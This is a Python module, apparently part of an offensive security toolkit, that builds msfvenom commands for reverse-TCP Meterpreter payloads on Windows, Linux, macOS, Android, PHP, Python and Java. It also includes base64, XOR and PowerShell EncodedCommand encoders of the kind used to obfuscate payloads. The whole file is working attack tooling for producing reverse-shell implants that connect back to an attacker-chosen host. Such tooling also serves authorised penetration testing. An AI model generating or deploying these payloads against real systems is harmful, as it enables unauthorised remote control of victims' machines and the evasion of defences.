"""Payload generation — msfvenom command builder + encoders."""

from __future__ import annotations

import base64
import logging
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

logger = logging.getLogger(__name__)

# platform -> default single-stage reverse payload
DEFAULT_PAYLOADS = {
    "windows": "windows/x64/meterpreter/reverse_tcp",
    "windows32": "windows/meterpreter/reverse_tcp",
    "linux": "linux/x64/meterpreter/reverse_tcp",
    "macos": "osx/x64/meterpreter/reverse_tcp",
    "android": "android/meterpreter/reverse_tcp",
    "php": "php/meterpreter/reverse_tcp",
    "python": "python/meterpreter/reverse_tcp",
    "java": "java/jsp_shell_reverse_tcp",
}

# platform -> conventional output format
DEFAULT_FORMATS = {
    "windows": "exe", "windows32": "exe", "linux": "elf", "macos": "macho",
    "android": "apk", "php": "raw", "python": "raw", "java": "war",
}


@dataclass
class Payload:
    platform: str
    payload: str
    lhost: str
    lport: int
    fmt: str
    command: str
    encoder: str = ""
    iterations: int = 0
    badchars: str = ""

    def as_dict(self) -> dict:
        return {
            "category": "payload",
            "platform": self.platform,
            "payload": self.payload,
            "lhost": self.lhost,
            "lport": self.lport,
            "format": self.fmt,
            "encoder": self.encoder,
            "command": self.command,
            "severity": "info",
        }


class PayloadGen:
    """Costruisce comandi msfvenom e piccoli encoder locali.

    Non richiede Metasploit installato per *generare il comando*: produce la
    riga msfvenom pronta da eseguire. Gli encoder base64/xor girano in locale.
    """

    def __init__(self, data_dir: Optional[Path] = None) -> None:
        self.data_dir = Path(data_dir) if data_dir else None

    def build(self, lhost: str, lport: int, platform: str = "windows",
              payload: str = "", fmt: str = "",
              encoder: str = "", iterations: int = 0,
              badchars: str = "", out: str = "") -> Payload:
        """Costruisce un Payload con la riga msfvenom corrispondente."""
        platform = platform.lower()
        payload = payload or DEFAULT_PAYLOADS.get(platform, DEFAULT_PAYLOADS["linux"])
        fmt = fmt or DEFAULT_FORMATS.get(platform, "raw")

        parts = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}"]
        if badchars:
            parts += ["-b", f"'{badchars}'"]
        if encoder:
            parts += ["-e", encoder]
            parts += ["-i", str(iterations or 1)]
        parts += ["-f", fmt]
        if out:
            parts += ["-o", out]

        command = " ".join(parts)
        return Payload(platform=platform, payload=payload, lhost=lhost,
                       lport=lport, fmt=fmt, command=command,
                       encoder=encoder, iterations=iterations, badchars=badchars)

    async def generate(self, lhost: str, lport: int,
                       platform: str = "windows", **kw) -> list[dict]:
        """Interfaccia async usata dal coordinatore (ritorna findings)."""
        p = self.build(lhost, lport, platform, **kw)
        return [p.as_dict()]

    # ── local encoders (no external tools) ──────────────────────────────

    @staticmethod
    def b64(raw: bytes | str) -> str:
        data = raw.encode() if isinstance(raw, str) else raw
        return base64.b64encode(data).decode()

    @staticmethod
    def xor(raw: bytes | str, key: bytes | str) -> bytes:
        data = raw.encode() if isinstance(raw, str) else raw
        k = key.encode() if isinstance(key, str) else key
        return bytes(b ^ k[i % len(k)] for i, b in enumerate(data))

    def powershell_b64(self, script: str) -> str:
        """EncodedCommand per powershell -e (UTF-16LE + base64)."""
        return base64.b64encode(script.encode("utf-16-le")).decode()

    def list_payloads(self) -> dict[str, str]:
        return dict(DEFAULT_PAYLOADS)
